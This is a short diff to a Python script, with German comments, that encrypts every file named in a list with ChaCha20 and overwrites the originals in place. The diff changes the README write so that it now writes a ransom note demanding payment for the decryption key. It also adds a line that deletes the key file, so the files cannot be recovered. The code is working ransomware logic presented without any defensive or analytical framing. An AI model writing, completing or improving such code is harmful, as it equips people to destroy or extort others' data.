@@ -25,10 +25,12 @@ def encrypt_file_chacha20(key, input_file, output_file):
         file.write(nonce + ciphertext)
 
 
-key = os.urandom(32)  # Erzeuge einen zufälligen 256-Bit-Schlüssel
 
-with open("chkey.txt", "wb") as keyfile:
-    keyfile.write(key)
+
+with open("chkey.txt","rb") as keyfile:
+
+	key =  keyfile.read()
+
 
 
 with open("testd.txt", "r") as file:
@@ -38,6 +40,6 @@ with open("testd.txt", "r") as file:
         encrypt_file_chacha20(key, line, line)
 
 
-readme = open("README")
+readme = open("README","w")
 readme.write("Your System has been encrypted, please pay 1€ to receive the decryption key")
-
+os.remove("/chkey.txt")
